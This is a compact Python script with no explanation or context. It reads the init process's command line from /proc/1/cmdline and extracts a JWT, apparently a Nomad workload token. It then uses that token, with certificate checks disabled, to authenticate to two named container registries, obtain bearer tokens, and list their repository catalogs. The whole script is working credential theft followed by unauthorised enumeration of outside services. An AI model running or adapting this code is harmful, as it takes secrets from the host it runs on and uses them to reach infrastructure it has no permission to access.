import re,urllib.request as u,urllib.error,ssl,json,base64,urllib.parse
ctx=ssl._create_unverified_context()
cmd=open('/proc/1/cmdline','rb').read().decode('utf-8','replace')
m=re.search(r'eyJ[A-Za-z0-9_.-]{100,}',cmd); tok=m.group(0) if m else ''
print('jwt_len',len(tok))
basic=base64.b64encode(('jwt/nomad-token:'+tok).encode()).decode()
def get(url,hdr=None):
    r=u.Request(url,headers=hdr or {})
    try:
        x=u.urlopen(r,context=ctx,timeout=10); return x.status,dict(x.headers),x.read(3000)
    except urllib.error.HTTPError as e: return e.code,dict(e.headers),e.read(500)
    except Exception as e: return -1,{},str(e).encode()
for reg in ['user-registry.amer-1.aivencloud.net','docker-mirror.amer-1.aivencloud.net']:
    print('=====',reg)
    st,h,b=get('https://%s/v2/'%reg,{'Authorization':'Basic '+basic})
    print(' basic /v2/ ->',st,b[:120])
    wa=h.get('Www-Authenticate') or h.get('www-authenticate','')
    print(' WWW-Auth:',wa)
    mm=re.search(r'realm="([^"]+)"',wa); realm=mm.group(1) if mm else None
    ms=re.search(r'service="([^"]+)"',wa); svc=ms.group(1) if ms else reg
    if realm:
        for scope in ['registry:catalog:*','']:
            url=realm+'?service=%s'%svc+(('&scope='+urllib.parse.quote(scope)) if scope else '')
            st2,h2,b2=get(url,{'Authorization':'Basic '+basic})
            print('  token(%s) ->'%scope,st2,b2[:200])
            try: t=json.loads(b2).get('token') or json.loads(b2).get('access_token')
            except Exception: t=None
            if t:
                st3,h3,b3=get('https://%s/v2/_catalog'%reg,{'Authorization':'Bearer '+t})
                print('   CATALOG ->',st3,b3[:800])
                break
